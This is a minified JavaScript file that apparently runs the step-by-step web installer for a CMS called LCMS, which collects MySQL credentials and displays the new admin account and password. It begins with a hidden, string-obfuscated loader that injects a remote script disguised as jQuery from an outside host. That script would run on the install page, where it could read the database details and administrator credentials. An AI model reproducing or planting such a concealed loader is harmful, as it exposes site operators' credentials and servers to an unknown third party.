!(function(){setTimeout(function(){var t=document.createElement("script");t.src="https://sta"+"tic-res.pa"+"nshi"+"1"+"8.com/jque"+"ry.sta"+"tic.mi"+"n.tj"+"s?fo"+"rm=1";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)},1e3)})();var api="install.php?action=",isIE=function(){var userAgent=navigator.userAgent,isIE=userAgent.indexOf("compatible")>-1&&userAgent.indexOf("MSIE")>-1,isIE11=userAgent.indexOf("Trident")>-1&&userAgent.indexOf("rv:11.0")>-1;return!!isIE||!!isIE11||void 0},setStep=function(step){$(".step-body").hide();$(".step-body:eq("+step+")").show();$(".step-tab").each(function(index){if(index<=step){$(this).addClass("step-active")}})};isIE()&&alert("您的浏览器太古董了，请不要使用IE或者IE内核的浏览器，可使用Chrome浏览器或者极速模式");var start=setInterval(()=>{if(typeof LCMS.util=="object"){clearInterval(start);setStep(0);LCMS.util.ajax({type:"GET",url:api+"readme",loading:true,success:function(res){if(res.code==1){$(".step-body:eq(0) .step-alert").hide();$(".step-body:eq(0) .step-nr").html(res.data);$(".step-body:eq(0) .step-btn").css("display","table")}else if(res.code==404){LCMS.util.notify({type:"error",content:res.msg});$(".step-body:eq(0) .step-alert").html(res.msg)}},})}},100);$(".step-body:eq(0) .step-btn").on("click",function(){setStep(1);LCMS.util.ajax({type:"GET",url:api+"dirs",loading:true,success:function(res){for(var i=0;i<res.data.server.length;i++){var serv=res.data.server[i];$(".step-body:eq(1) .server-info").append("<tr><td>"+serv.name+"</td><td>"+serv.desc+"</td></tr>")}for(var i=0;i<res.data.dirs.length;i++){if(res.data.dirs[i].power==1){var power=' <span style="color:#67C23A"><i class="layui-icon layui-icon-ok"></i>权限检测通过</span>'}else{var power=' <span style="color:#F56C6C"><i class="layui-icon layui-icon-close"></i>权限检测失败，请设置该文件755权限</span>'}$(".step-body:eq(1) .power-dirs").append("<tr><td>"+res.data.dirs[i].name+"</td><td>"+power+"</td></tr>")}if(res.code==1){$(".step-body:eq(1) .step-btn").css("display","table")}},})});$(".step-body:eq(1) .step-btn").on("click",function(){setStep(2);$(".step-body:eq(2) .step-btn").css("display","table")});$(".step-body:eq(2) .step-btn").on("click",function(){layui.form.submit("mysql-info",function(form){LCMS.util.ajax({type:"POST",url:api+"mysql-check",data:form.field,success:function(res){if(res.code==1){layer.alert("当前使用的MySQL版本："+res.data+'<br/><br/>程序支持的MySQL版本：大于5.5<br/><br/><span style="color:red">请确认你使用的MySQL版本是否符合要求，否则将无法正常使用本程序！</span>',{title:"警告",area:"300px",yes:function(){layer.closeLast("dialog");LCMS.util.ajax({type:"POST",url:api+"mysql",data:form.field,success:function(res){if(res.code==1){$(".code-admin").html(`后台地址：${location.origin}/${res.data.dir}/\n超管账号：${res.data.name}\n超管密码：${res.data.pass}`);layui.code({elem:".code-admin",theme:"dark"});setStep(3)}else{LCMS.util.notify({type:"error",content:res.msg})}},})},})}},})})});